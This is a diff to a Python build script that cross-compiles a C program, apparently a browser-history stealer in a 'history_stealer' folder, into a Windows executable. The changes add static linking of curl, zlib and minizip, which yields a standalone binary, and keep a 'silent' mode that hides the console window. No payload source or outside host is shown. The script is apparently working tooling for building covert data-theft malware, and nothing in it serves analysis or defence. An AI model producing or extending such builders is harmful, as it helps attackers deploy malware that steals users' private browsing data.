@@ -9,19 +9,6 @@ def check_mingw():
     except FileNotFoundError:
         return False
 
-def install_dependencies():
-    """Install required packages."""
-    try:
-        subprocess.run(["sudo", "apt", "update"], check=True)
-        subprocess.run(["sudo", "apt", "install", "-y", "mingw-w64", "zlib1g-dev", "libcurl4-openssl-dev"], check=True)
-        if not os.path.exists("/usr/x86_64-w64-mingw32/include/zip.h"):
-            subprocess.run(["git", "clone", "https://github.com/madler/zlib.git", "/tmp/zlib"], check=True)
-            subprocess.run(["make", "-C", "/tmp/zlib/contrib/minizip", "-f", "Makefile.mingw"], check=True)
-            subprocess.run(["sudo", "cp", "/tmp/zlib/contrib/minizip/zip.h", "/usr/x86_64-w64-mingw32/include/"], check=True)
-            subprocess.run(["sudo", "cp", "/tmp/zlib/contrib/minizip/libminizip.a", "/usr/x86_64-w64-mingw32/lib/"], check=True)
-    except subprocess.CalledProcessError as e:
-        raise Exception(f"Failed to install dependencies: {e}")
-
 def generate_config_h(config):
     """Generate config.h based on config dict."""
     config_content = f"""#ifndef CONFIG_H
@@ -53,11 +40,19 @@ def compile_program(silent):
         "x86_64-w64-mingw32-gcc",
         source_file,
         "-o", output_file,
-        "-lshlwapi", "-lshell32", "-lz", "-lminizip", "-lcurl",
+        "-Ihistory_stealer/deps",  # Include path for headers
+        "-Lhistory_stealer/deps",  # Library path
+        "-lcurl", "-lz", "-lminizip",  # Static libraries in deps
+        "-lshlwapi", "-lshell32",  # Windows system libraries
+        "-static",  # Static linking for standalone executable
         "-DUNICODE", "-D_UNICODE"
     ]
     
     if silent:
         cmd.append("-mwindows")
     
-    subprocess.run(cmd, check=True)
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        return {"success": True, "output": result.stdout}
+    except subprocess.CalledProcessError as e:
+        raise Exception(f"Compilation failed: {e.stderr}")
